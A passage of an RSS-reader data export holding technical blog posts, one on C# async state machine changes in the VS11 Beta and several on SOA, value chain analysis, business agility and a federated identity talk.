href=\"http://msdn.microsoft.com/en-us/library/hh472313(v=vs.110).aspx\">Start&lt;TStateMachine&gt;</a>on the<a href=\"http://msdn.microsoft.com/en-us/library/hh138506(v=vs.110).aspx\">AsyncTaskMethodBuilder&lt;T&gt;</a>(or whichever method builder it's using). It passes the state machine by reference (presumably for efficiency), and TStateMachine is constrained to implement the now-public-and-in-mscorlib<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.iasyncstatemachine(v=vs.110).aspx\">IAsyncStateMachine</a>interface. I'll come back to the relationship between the state machine and the builder later on.</p><h2>Task caching</h2><p>(Code is in project 30:<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FTaskCaching\">TaskCaching</a>)</p><p>It's possible for an async method to complete entirely synchronously. In this situation, the result is known before the method returns, and the task returned by the method is already in the RanToCompletionState. If two tasks have already run to completion with the same value, they can be (apparently) regarded as equivalent... so the beta now caches a task in this situation, for some types and values. (Apparently the preview cached too, but I hadn't noticed, and the beta caches more.) According to my experiments and some comments:</p><ul><li>For int, tasks with values -1 to 8 inclusive are cached</li><li>For bool, both values (true and false)</li><li>For char, byte, sbyte, short, ushort, uint, long, ulong, IntPtr and UIntPtr tasks with value 0 (or'\\0') are cached</li><li>For reference types, null is cached</li><li>For other types, no tasks are cached</li></ul><p>EDIT: After they've completed, tasks are normally immutable<em>except for disposal</em>- the cached tasks are tweaked slightly to make disposal a no-op.</p><h2>State machine interface changes</h2><p>In the VS11 preview release, each state machine implemented an interface, but that interface was internal to the generated assembly, and contained a single method (SetMoveNextDelegate). It's now a public interface with two methods:</p><ul><li><a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.iasyncstatemachine.movenext(v=vs.110).aspx\">MoveNext</a></li><li><a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.iasyncstatemachine.setstatemachine(v=vs.110).aspx\">SetStateMachine</a></li></ul><p>Personally I'm not keen on the naming of\"MoveNext\" - I can't help but feel that if we didn't have the\"naming baggage\" of IEnumerator and the fact that at least early on, the code generator was very similar to that used for iterator blocks, we'd have something different. (It<em>is</em>moving to the next state of the state machine, but it still doesn't quite feel right.) I'd favour something like\"ContinueExecution\". However, it doesn't matter - it obviously does what you'd expect, and you're not going to be calling this yourself.</p><p>SetStateMachine is a stranger beast. The documentation states:</p><blockquote><p>Configures the state machine with a heap-allocated replica.</p></blockquote><p>... which says almost nothing, really. The implementation is always simple, just like SetMoveNextDelegate was, although this time it delegates to the builder for the real work (a common theme, as we'll see):</p><div class=\"code\"><span class=\"ValueType\">void</span>IAsyncStateMachine.SetStateMachine(IAsyncStateMachine param0)<br />{<br />   <span class=\"Keyword\">this</span>.&lt;&gt;t__builder.SetStateMachine(param0);<br />}</div><p>Now<a href=\"http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.asynctaskmethodbuilder.setstatemachine(v=vs.110).aspx\">AsyncTaskMethodBuilder.SetStateMachine</a>is also documented pretty sparsely:</p><blockquote><p>Associates the builder with the specified state machine.</p></blockquote><p>Again, no real help. However, we'll see that it's the<em>builder</em>which is responsible for calling OnContinue now, and as it can call MoveNext on an IStateMachine, it makes sense to tell it which state machine it's associated with... but can't it do that directly?</p><p>Well, not quite. The problem (as I understand it) is around when boxing occurs. We initially create the state machine on the stack, and it contains the builder. (Both are structs.) That's fine until we need a continuation, but then we've got to be able to get back to the current state later, after the current stack frame has been blown away. So we need to box the state machine. That will create a<em>copy</em>of the current builder (within the box). We need the builder within the boxed state machine to contain a reference to the same box. So the order has to be:</p><ul><li>Box the state machine</li><li>Tell the state machine about the boxed reference</li><li>The state machine tells its nested builder about the boxed reference</li></ul><p>Back when the state machine was in charge of the boxing, this went via the delegate: the act of creating the box was implicit when creating the delegate, and then casting the delegate target to the interface type allowed a reference to the newly-created delegate to be set within the copy. This is similar, but using the builder instead. It's hard to follow, but of course it's not going to matter.</p><h2>State machine field changes</h2><p>There are various kinds of fields in the state machine:</p><ul><li>Those corresponding with local variables and parameters in the async method</li><li>The state</li><li>The field(s) associated with awaiters</li><li>(In the preview/beta) The field associated with the\"current execution stack\" at the point of an await expression</li><li>(In the CTP) An unused\"disposing\" field</li></ul><p>Of these, I believe only the awaiters have actually changed, but before we talk about that, let's revisit local variables.</p><h3>Local variable hoisting</h3><p>I've just noticed that the local variables are only hoisted to fields when its scope contains an await expressions, but in that case<em>all</em>local variables of that scope are hoisted, whether or not they're used\"across\" awaits. It would be possible to hoist only those which need to be maintained between executions, but then you wouldn't be able to see the others when debugging, which would be somewhat confusing. Likewise local variables of the same type which are never propagated across the same await<em>could</em>be aliased. For example, consider this async method:</p><div class=\"code\"><span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task&lt;<span class=\"ValueType\">int</span>&gt; M(Random rng)<br />{<br />   <span class=\"ValueType\">int</span>x = rng.Next(1000);<br />   <span class=\"ValueType\">int</span>y = x + rng.Next(1000);<br />        <br />   <span class=\"Modifier\">await</span>Task.Yield();<br />        <br />   <span class=\"ValueType\">int</span>z = y + rng.Next(1000);<br />        <br />   <span class=\"Modifier\">await</span>Task.Yield();<br />   <span class=\"Statement\">return</span>z;<br />}</div><p>If the compiler could be confident you didn't need to debug through this code, it<em>could</em>make do with one field of type\"Random\" and one field of type\"int\" - x can be a completely local variable in MoveNext (it's not used between two awaits) and y and z can be aliased (we never need the value of y after we've first written to z).</p><p>Local variable aliasing probably isn't particularly useful for\"normal\" methods as the JIT may be able to do it (so long as you don't have a debugger attached, potentially) but in this case we expect the state machine to be boxed at some point, so potentially<em>does</em>make a difference (while the stack is typically reasonably small, you could have a<em>lot</em>of outstanding async methods in some scenarios). Maybe in a future release, the C# compiler could have an aggressive optimization mode around this, to be turned on explicitly. (I don't think it should be  a particularly high priority, mind you.)</p><h3>Awaiter fields</h3><p>(Code is in project 31,<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FAwaiterFields\">AwaiterFields</a>.)</p><p>Awaiter fields have changed a bit over the course of async's history.</p><p>In the CTPs (all of them, I believe) each await expression had its own awaiter field in the state machine, with a type corresponding to the declared awaiter type from the awaitable. (Remember that the awaitable is the thing you await, such as a task, and the awaiter is what you get back from calling GetAwaiter on the awaitable).</p><p>In the VS11 Preview, there was always a single awaiter field of type object. From what I saw, it was usually populated with a single-element array containing an awaiter. For value type awaiters (i.e. where the awaiter is a struct) this is somewhat similar to boxing, but maintaining strong typing, so calls to IsCompleted etc can still be made. It's possible that reference type awaiters were stored without the array creation, as it would serve no purpose. (I don't have any machines with just the preview installed to verify this.)</p><p>In the Beta, we have a mixture. If there are any reference type awaiters, they all end up being stored in a single field of type object, which is then cast back to the actual type when required. (Don't forget that only one awaiter can be\"active\" at a time, which makes this possible.) This includes awaiters of an interface type - it's only the<em>compile-time</em>type declared as the return type of the GetAwaiter method of the awaitable which is important.</p><p>If any of the awaiter types are value types, each of these types gets its own field. So there might be a TaskAwaiter&lt;int&gt; field and a TaskAwaiter&lt;string&gt; field, for example. However, there can still be\"sharing\" going on: if there are multiple await expressions all of the same value type awaiter, they will all share a single field. (This all feels a<em>little</em>like the JITting of generics, but it's somewhat coincidental.)</p><h2>MoveNext method changes</h2><p>(Code is in project 32, BetaStateMachine)</p><p>As I've mentioned earlier, the builder is now responsible for a lot more of the work than it was in earlier versions. The majority of the code remains the same as far as I can tell, in terms of handling branching, evaluating expressions with multiple await expressions and so on.  The code in the source repository shows what the complete state machine looks like, but for the sake of clarity, I'll just focus on a single snippet. If we have an await expression like this:</p><div class=\"code\"><span class=\"Modifier\">await</span>x;</div><p>then the state machine code in the VS11 Preview would look something like this:</p><div class=\"code\">localTaskAwaiter = x.GetAwaiter();<br /><span class=\"Statement\">if</span>(localTaskAwaiter.IsCompleted)<br />{<br />   <span class=\"Statement\">goto</span>AwaitCompleted;<br />}<br /><span class=\"Keyword\">this</span>.state = 1;<br />TaskAwaiter[] awaiterArray = { localTaskAwaiter };<br /><span class=\"Keyword\">this</span>.awaiter = awaiterArray;<br />Action continuation =<span class=\"Keyword\">this</span>.MoveNextDelegate;<br /><span class=\"Statement\">if</span>(continuation ==<span class=\"Keyword\">null</span>)<br />{<br />    Task&lt;<span class=\"ValueType\">int</span>&gt; task =<span class=\"Keyword\">this</span>.builder.Task;<br />    continuation = MoveNext;<br />    ((IStateMachine) continuation.Target).SetMoveNextDelegate(continuation);<br />}<br />awaiterArray[0].OnCompleted(continuation);<br />...<br /><span class=\"Statement\">return</span>;</div><p>(That's just setting up the await, of course - there's then the bit where the result is fetched, but that's less interesting. There's also the matter of doFinallyBodies.)</p><p>In the VS11 Beta, it's something this instead (for an awaiter type\"AwaiterType\" which implements ICriticalNotifyCompletion, in a state machine of type ThisStateMachine).</p><div class=\"code\">localAwaiter = x.GetAwaiter();<br /><span class=\"Statement\">if</span>(!localAwaiter.IsCompleted)<br />{<br />    state = 0;<br />    awaiterField = localAwaiter;<br />    builder.AwaitUnsafeOnCompleted&lt;AwaiterType, ThisStateMachine&gt;(<span class=\"MethodParameter\">ref</span>localAwaiter,<span class=\"MethodParameter\">ref</span> <span class=\"Keyword\">this</span>);<br />    doFinallyBodies =<span class=\"Keyword\">false</span>;<br />   <span class=\"Statement\">return</span>;<br />}</div><p>If the awaiter type only implements INotifyCompletion, it calls<a href=\"http://msdn.microsoft.com/en-us/library/hh472321(v=vs.110).aspx\">AwaitOnCompleted</a>instead. Note how the calls are generic (but both type variables are constrained to implement appropriate interfaces) which avoids boxing.</p><p>The call to the builder will call<em>back</em>to the state machine's SetStateMachine method if this is the first awaiter that hasn't already completed within this execution of the async method. So that handles the section which checked for the continuation being null in the first block of code. Most of the rest of the change is explained by the difference in awaiter types, and obviously AwaitOnCompleted/AwaitUnsafeOnCompleted<em>also</em>ends up calling into OnCompleted on the awaiter itself.</p><h2>Mutable value type awaiters</h2><p>(Code is in project 32,<a href=\"http://code.google.com/p/eduasync/source/browse/#hg%2Fsrc%2FMutableAwaiters\">MutableAwaiters</a>)</p><p>One subtle difference which<em>really</em>shouldn't hurt people but is fun to explore is what happens if you have an awaiter which is a mutable value type. Due to the way awaiters were carefully handled pre-beta, mutations which were conducted as part of OnCompleted would still be visible in GetResult. That's<em>not</em>the case in the beta (as Stephen mentions in his blog post). Mind you, it doesn't mean that<em>all</em>mutations will be ignored... just ones in OnCompleted. A mutation from IsCompleted is still visible, as shown here:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"ValueType\">struct</span>MutableAwaiter : INotifyCompletion<br />{<br />    <span class=\"Modifier\">private</span> <span class=\"ReferenceType\">string</span>message;<br /><br />    <span class=\"Modifier\">public</span>MutableAwaiter(<span class=\"ReferenceType\">string</span>message)<br />     {<br />        <span class=\"Keyword\">this</span>.message = message;<br />     }<br /><br />    <span class=\"Modifier\">public</span> <span class=\"ValueType\">bool</span>IsCompleted<br />     {<br />         get<br />         { <br />             message =<span class=\"String\">\"Set in IsCompleted\"</span>;<br />            <span class=\"Statement\">return</span> <span class=\"Keyword\">false</span>;<br />         }<br />     }<br /><br />    <span class=\"Modifier\">public</span> <span class=\"ValueType\">void</span>OnCompleted(Action action)<br />     {<br />         message =<span class=\"String\">\"Set in OnCompleted\"</span>;<br />        <span class=\"InlineComment\">// Ick! Completes inline. Never mind, it's only a demo...</span><br />         action();<br />     }<br /><br />    <span class=\"Modifier\">public</span> <span class=\"ReferenceType\">string</span>GetResult()<br />     {<br />        <span class=\"Statement\">return</span>message;<br />     }<br />}</div><p>What would you expect to be returned from this awaiter? You can verify that all three members are called... but\"Set in IsCompleted\" is returned. That's because IsCompleted is called<em>before</em>the awaiter value is copied into a field within the state machine. Even though the state machine passes the awaiter by reference, it's passing the<em>local</em>variable, which is of course a separate variable from the field.</p><p>I'm<em>absolutely not</em>suggesting that you should rely on any of this behaviour. If you really need to be able to mutate your awaiter, make it a reference type.</p><h2>Conclusion</h2><p>The main changes in the Beta are around the interactions between the AsyncTaskMethodBuilder (et al) and the state machine, including the new interfaces for awaiters. There's been quite a bit of optimization, although I still see room for a bit more:</p><ul><li>When there's only a single kind of reference type awaiter, the field for storing it could be of that type rather than of type object, removing the need for an execution-time cast</li><li>The\"stack\" variable could be removed in some cases, and made into a specific type in many others</li><li>With appropriate optimization flags, local variables which aren't used await expressions could stay local to the state machine instead of being hoisted, and hoisted variables could be aliased in some cases.</li></ul><p>One thing which concerns me slightly is how the C# language specification is going to change - the addition of the new interfaces is definitely going to mean more complexity from this previously\"tidy\" feature. I'm sure it's worth it for the sake of efficiency and the like, but part of me sighs at every added tweak.</p><p>So, is this now close to the finished version of async? Only time will tell. I haven't checked whether dynamic awaitables have finally been introduced... if they have, I'll put that in the next post.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1807031\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/RJXvEh-Qhn4\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1298}}
{"k":"0000000084","o":"0000001989","v":"001"}
{"_id":1299,"_uid":1299,"_dt":1373742620984,"_s":"6ddf324748de49bdc79bc789b2000977"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/UHbMGQ8vm6k/federated-identity-management-in.html","title":"Federated Identity Management in a Service Oriented World","published":{"$wrap":"$date","v":1219154940003,"h":"2008-08-19T14:09:00.003Z"},"starred":false,"read":false,"content":"Join me as I present to the<a href=\"http://perthdotnet.org/Default.aspx\">Perth .NET Community of Practice</a>on Federated Identity Management in a Service Oriented World.  The session synopsis is below:<br /><br /><i>Gone are the good old days of siloed applications that identify users with a simple username/password combination stored in the application database.  In today’s world of Internet based e-commerce where secure transactions occur over insecure open networks and in a service oriented world of composite applications where identity must be shared between systems hosted by different organisations on disparate platforms; in a world where increasing numbers of businesses are turning to hosting their applications in the cloud, and where users from partner organisations need to be securely granted access to enterprise resources, architects are turning to an ever increasingly complex array of security solutions to solve their identity woes.<br /><br />How do we as mere mortals make sense of PKI, Kerberos, SAML, and a plethora of WS-* standards aimed at addressing these concerns?  This session will provide a clear and practical description of how to apply today’s security technologies in order to effectively manage and share identity across applications, service and organisational boundaries.</i><br /><br />Details below:<br /><br />DATE: Thursday, September 4, 5:30pm<br />VENUE: Excom, Level 2, 23 Barrack Street, Perth<br />COST: Free. All Welcome<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/UHbMGQ8vm6k\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1299}}
{"k":"0000000084","o":"0000009707","v":"001"}
{"_id":1300,"_uid":1300,"_dt":1373742620984,"_s":"d21818f86fa9adbb06246bfe1fdc1bf3"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/9G_jUw0pPB4/value-chain-analysis.html","title":"Value Chain Analysis","published":{"$wrap":"$date","v":1217514480006,"h":"2008-07-31T14:28:00.006Z"},"starred":false,"read":false,"content":"Recently we<a href=\"http://bill-poole.blogspot.com/2008/07/business-capabilities.html\">discussed</a>how business services are realised in terms of business process, people, information, data, applications, and technology.  A business service can be seen as a cohesive business capability that does not share process, data or business rules with any other capability.<br /><br />The interface (or service contract) between business services is expressed in terms of business events.  Business services are not dependent on how other business services are fulfilled, only the business events they raise.  Consequently, the business architecture description is very stable.  We can update process implementations without impacting any other processes so long as the high level business events are unaffected.<br /><br />Our technical service components are then aligned with our business services and business events, extending this stability and loose coupling to our IT architecture.<br /><br />So business capabilities are the key ingredient in determining our service model.  But how do we go about identifying business capabilities?  Do we simply think about what a business does at a high level and decompose?  Or is there a better way?<br /><br />A while back<a href=\"http://blogs.msdn.com/nickmalik/\">Nick Malik</a>wrote about the<a href=\"http://blogs.msdn.com/nickmalik/archive/2008/04/24/merging-capability-modeling-with-process-modeling.aspx\">relationship between capability modelling and process modelling</a>.  He posed the question as to whether these two approaches conflict, or if they are in fact complimentary.  If you've been reading my recent posts on the matter you would probably guess that I feel the two approaches are very much complimentary.<br /><br />Nick suggests that there are two main approaches one may take in identifying business capabilities.  One is process centric where capabilities are defined around process areas within an organisation.  The other suggested approach is to align business capabilities with organisational structure.  In this approach, capabilities mirror the structure of a business (such as divisions, departments, business units and teams), rather than its processes.<br /><br />As you've probably gleaned from my previous posts on business architecture modelling, I very much favour the process centric approach.  In fact, the premise of modelling business services around capabilities<i>relies</i>on the capabilities being process-centric.  As I mentioned above, the interface between business services is expressed in terms of business events.  Business events are raised by business processes.<br /><br />If a single business process were to feature in multiple capabilities (as would be the case if we modelled our capabilities around organisational structure rather than process areas), then multiple capabilities would expose the same business events.  Moreover, updating a single business process would potentially involve updating the implementation of multiple business capabilities.<br /><br />So when using business capabilities as a means of identifying candidate business services we must take a process-centric approach.  How then do we produce a process-centric capability model of our enterprise?  The answer lies with<a href=\"http://en.wikipedia.org/wiki/Value_chain\">Value Chain Analysis</a>.<br /><br />Value Chain Analysis involves identifying the top level process areas (or functions) of an organisation and mapping them as a value chain.  The value chain illustrates the series of top-level processes an organisation uses to take inputs from the market, transform those inputs, and then deliver value added products and/or services back to the market at a profit.  These processes are synergistic in nature.  The total cost of these processes is less than the value added by the organisation, thus justifying the profit margin.<br /><br />A value chain is modelled in terms of primary and support activities.  Primary activities are those that feature in the value chain itself.  They are the processes responsible for engaging with the market and directly transforming inputs into outputs.  Support activities support the primary activities.<br /><br />The value chain for a typical insurance organisation is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s1600-h/Insurance+Value+Chain.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s400/Insurance+Value+Chain.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229186836651515026\" /></a><br />There are seven primary and seven support activities in the above example.  Each activity contains a number of processes that support the activity.  Note that not<i>all</i>processes within a primary activity necessarily directly contribute to the value chain.  A primary activity must only contain at least one process that contributes to the value chain.<br /><br />An organisation may also have multiple value chains.  Multiple value chains may arise where the organisation serves more than one market.  Different markets may be served with fundamentally different processes within the organisation.<br /><br />For example if we were to take two companies supplying completely different products to completely different markets and a merger were to occur, then we would end up with one organisation with two value chains.  Support activities in one value chain may be primary activities in another.<br /><br />The value chain depicts an end-to-end process that executes left to right.  In the above example, Marketing sits at the beginning of the value chain because the business must determine what products it is going to offer before doing anything else.  After determining the product mix and pricing strategy, Risk Modelling must occur to determine the means by which premium will be calculated for each product.<br /><br />Armed with this information, actual pricing (rate charts) can be determined for each product.  Note that this occurs in the Marketing activity.  So we have transitioned<i>back</i>from Risk Modelling to Marketing.  Feedback loops are always going to occur within value chains.  The point is that the first process that had to occur (determining the product mix) lay within the Marketing activity, and thus Marketing sits before Risk Modelling in the value chain.<br /><br />Now the business is in a position to start selling its insurance products to customers.  This is the Sales activity.  The Sales activity involves quotations, proposals, risk assessment and commission calculation.  Commissions are paid to all parties involved in the distribution channel.<br /><br />Once a policy has been sold, it must be written.  This is a Policy Administration activity.  Once the policy has been written, the customer must then be billed.  Once the premium has been paid by the customer, the customer<i>may</i>at some point register a claim.  Note that this activity is optional.  A customer may<i>never</i>register a claim.  The Customer Service function is then responsible for serving the needs of the customer until his or her policy expires.<br /><br />A value chain gives us a<i>functional model</i>of our organisation.  That is, it models the functions an organisation performs without consideration for<i>how</i>they are performed.  This is what gives the model its stability.<br /><br />Later on as we drill down into the lower level processes supporting each activity in the value chain, we start getting into the implementation details.  We start modelling the exact sequence of actions performed and the roles that are responsible for those actions.<br /><br />It is through defining these lower level processes that we in fact are able to define the roles within the organisation and the responsibilities and KPIs for each role.  Armed with this, we are then in a position to determine the organisational structure - that is, the reporting relationships between the defined roles.<br /><br />This is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s1600-h/Organisational+Structure+%26+Design.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s400/Organisational+Structure+%26+Design.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229194014332757906\" /></a><br />As lower level processes change within an organisation, so may the roles and responsibilities and by extension the organisational structure.  This is further evidence of why we should model capabilities around business functions rather than organisational structure.  It provides a considerably more stable model.<br /><br />This activity of modelling the value chain has forced us to consider the entire business in a holistic and process centric way.  As such it is an excellent tool for identifying our top level process centric business capabilities that we can then use to define our business service model.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/9G_jUw0pPB4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1300}}
{"k":"0000000084","o":"0000005916","v":"001"}
{"_id":1301,"_uid":1301,"_dt":1373742620984,"_s":"7c1ae6571cbcc2f16f97e9630619b73e"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/NTVjotOGZA8/business-agility.html","title":"Business Agility","published":{"$wrap":"$date","v":1222592160002,"h":"2008-09-28T08:56:00.002Z"},"starred":false,"read":false,"content":"Business agility (along with<a href=\"http://bill-poole.blogspot.com/2008/08/business-it-alignment.html\">business-IT alignment</a>) is often touted as one of the key benefits of SOA.  The problem is that more often than not no explanation is given for what business agility actually<i>is</i>, why it is important, or how SOA contributes to achieving it.<br /><br />Firstly, it is important to note that business agility is a relative goal as opposed to an absolute one.  Even the most agile business can strive for greater agility.<br /><br />So what is business agility?  Business agility is the degree to which an organisation can effectively innovate and respond to market forces.<br /><br />In any given undertaking within an organisation, there are the traditional project management constraints of time, resource, scope and quality.  For a fixed scope if we wish to decrease time to delivery, we must increase resource or decrease quality.  For fixed resource if we wish to decrease time to delivery, we must decrease scope or quality.<br /><br />Note that scope refers to the amount of work that needs to be done to deliver the agreed outcome.  But as always, there is more than one way to skin a cat.  The business objectives targeted by the project can be met in any number of different ways.  A talented Solution Architect can design a solution to a business problem that requires less work to deliver.<br /><br />Really what we are talking about here is contrasting<i>business value</i>with<i>effort</i>.  If an organisation has a highly complex IT architecture that is very tightly coupled with a large number of interdependencies, then a change will take more<i>effort</i>to achieve, but deliver the same<i>business value</i>.<br /><br />In order to have an agile organisation, we must have the ability to enact change with less effort.  SOA helps simplify the IT architecture of an organisation by making systems more loosely coupled.  Of course, there are varying degrees of loose coupling with different SOA implementations.<br /><br />The SOA architectural style reduces coupling through message based interactions conforming to explicitly defined service contracts that encapsulate the implementation details of services away from consumers.  This gives us the ability to make changes to service implementations without impacting their consumers.<br /><br />We reduce coupling further by designing our services with appropriate<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">granularity and cohesion</a>, based on publish-subscribe messaging with<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">stable service contracts</a>.<br /><br />The IT architecture of an organisation however is only one piece of the business agility puzzle.  Once a business need has been identified, the business requirements must be extracted.  The speed, efficiency and accuracy with which this activity is performed also contribute to business agility.  There is very little business value in delivering a solution that doesn't meet the identified business objectives.<br /><br />Furthermore once we have extracted our business requirements, assuming they are accurate, we need to produce a solution architecture that meets those requirements.  So an organisation's proficiency in Solution Architecture is also significant here.<br /><br />We also want to ensure that as each solution is delivered, the complexity of the business and IT architecture is not adversely affected.  As such, we need the proper architecture governance processes in place to protect the broader enterprise architecture.<br /><br />It is important to strike the right balance with governance however.  Inefficient governance processes slow the rate at which projects can be delivered, thus harming business agility.  Insufficient governance however will result in the gradual increase of architectural complexity, thus harming business agility in the long run.<br /><br />Simply developing an effective solution architecture is still not enough.  We must of course then go about implementing the solution.  Here, the effectiveness of the organisation's project and programme management function is relevant, as well as the proficiency of the people that build and deploy the solution.<br /><br />And finally once the solution is ready to deploy, there must be effective change management processes in place to ensure that affected workers are properly trained and informed to support the change.  If the solution is not embraced by the people it affects, then the change will be ineffective.<br /><br />So why all the fuss about business agility?  Simply put, an organisation that doesn't respond to its changing environment will eventually become uncompetitive.  Granted that some industries are more volatile than others, however all business environments change over time.  Those businesses that are able to embrace this change in order to generate competitive advantage will be more successful.<br /><br />Innovation is also a key consideration in generating competitive advantage.  The ability to be able to take an idea and turn it into reality in less time, with less cost and lower risk certainly generates competitive advantage.<br /><br />So in conclusion, SOA as a style of architecture<i>contributes</i>towards business agility through reduction of enterprise architectural complexity, but by no means guarantees it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/NTVjotOGZA8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1301}}
{"k":"0000000084","o":"0000000893","v":"001"}
{"_id":1302,"_uid":1302,"_dt":1373742620985,"_s":"1e51197ccc7eee8d595e4a575af0ff00"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/PqBnvSAxoN4/federated-identity-session-slides.html","title":"Federated Identity Session Slides","published":{"$wrap":"$date","v":1220587320002,"h":"2008-09-05T04:02:00.002Z"},"starred":false,"read":false,"content":"Thank you to all those who attended the<a href=\"http://perthdotnet.org/Default.aspx\">.NET Community of Practice</a>session on Thursday evening.  For those who missed it, you can download the presentation slides<a href=\"http://9ci9rq.bay.livefilestore.com/y1pgDyF4KbKkUxlDKB1lV01cR3dqeutzg19ykVe19g25sNMyE_h5efdBBA8C2ODwk7Pv4eFkv4zZIlfy0KGCt6Y6g/Federated%20Identity%20Management.pptx?download\">here</a>.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/PqBnvSAxoN4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1302}}
{"k":"0000000084","o":"0000003142","v":"001"}
{"_id":1303,"_uid":1303,"_dt":1373742620985,"_s":"9566f1cfa412dfa23dae93332144f9f9"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/COA5WXccvL8/soa-and-platform-independence.html","title":"SOA and Platform Independence","published":{"$wrap":"$date","v":1219151820003,"h":"2008-08-19T13:17:00.003Z"},"starred":false,"read":false,"content":"Quite often I hear platform independence as not only a key benefit of SOA, but a defining characteristic.  Let me begin by saying this is simply not the case.  Platform independence in the context of SOA has two connotations:<br /><br />1. Services can be hosted on any platform (Windows, Linux, .NET, Java, etc)<br />2. Services are interoperable regardless of the platforms on which they are hosted<br /><br />Firstly, let us examine what a service is from a technical standpoint.  A service is an autonomous coarse grained unit of logic which external parties can communicate by way of exchanging explicitly defined messages via its endpoints.  The messages and endpoints are described by the service contract.  Consumers must conform to policies stipulated by a service provider in order to consume the service.<br /><br />Based on the above definition, any platform that can host a process that can exchange messages over a network is capable of hosting a service.  This is not a miracle of SOA, it is simply the miracle of distributed computing which was around long before the emergence of SOA.<br /><br />The second thing to note about the above definition is that it does not mandate any specific<i>transport</i>or<i>encoding</i>of messages.  Messages do<i>not</i>have to be encoded in XML.  They do<i>not</i>have to be transported over HTTP.  Service contracts do<i>not</i>have to be specified in WSDL.  Services<i>do not have to be natively interoperable</i>.<br /><br />Now it is true that Web service technologies greatly improve service interoperability between platforms.  But services in our SOA do not have to be Web services.  Even Web services by today's definition do not mandate that messages are transported over HTTP.  It is quite acceptable for a Web service to be exposed over a JMS or MSMQ transport.  JMS and MSMQ are<i>not</i>natively interoperable.<br /><br />It is also true that an intermediary such as an ESB can provide protocol translation which can make services that exchange messages with incompatible transports and encodings interoperable.  But again, an ESB is<i>not</i>a prerequisite for SOA.<br /><br />I guess the commonly held view that SOA and platform independence go hand in hand has emerged from the association between SOA and Web services.  But once again just to set the record straight, SOA does not mandate platform independence.<br /><br />SOA<i>does</i>however mandate that implementation details of a service are encapsulated behind the service contract.  As such, SOA certainly makes platform independence easier to achieve.  We just need to overcome any incompatibilities in message transport and encoding.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/COA5WXccvL8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1303}}
{"k":"0000000084","o":"0000002935","v":"001"}
{"_id":1304,"_uid":1304,"_dt":1373742620985,"_s":"cdcb82c96d8e57fe740d722fa4e625e1"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/Isfq9MlkoVg/transactional-services-continued.html","title":"Transactional Services (continued...)","published":{"$wrap":"$date","v":1215330300003,"h":"2008-07-06T07:45:00.003Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/06/transactional-services.html\">last post</a>we discussed the concept of transactional services and how they ensure business actions can be executed atomically within a service by enrolling local queue and/or topic resources into a distributed transaction. What I did not explain however is<i>why</i>queues and topics are essential for supporting transactional services.<br /><br />Queues and topics are necessary to support transactional services because that both types of transports queue messages while they await delivery.  Although the transport may not store messages durably, they are still stored somewhere until they are delivered.  Neither the sender nor receiver holds onto the message during its transport.<br /><br />So, would it be possible to implement transactional services using a non-queued transport?  For example, let us assume we wanted to use WS-AtomicTransaction (WS-AT) over an HTTP transport.  As it turns out, it is not possible to achieve this without spanning the distributed transaction across your service boundaries.  As we all know, spanning transactions across service boundaries is not a good idea as it hurts performance and reliability.<br /><br />The reason for this is that with queued transports, messages are delivered to the receiver using a pull based mechanism. Messages are first pushed to the receiving queue, after which they wait to be read by the receiver at a later time.  This means that the sending service can complete 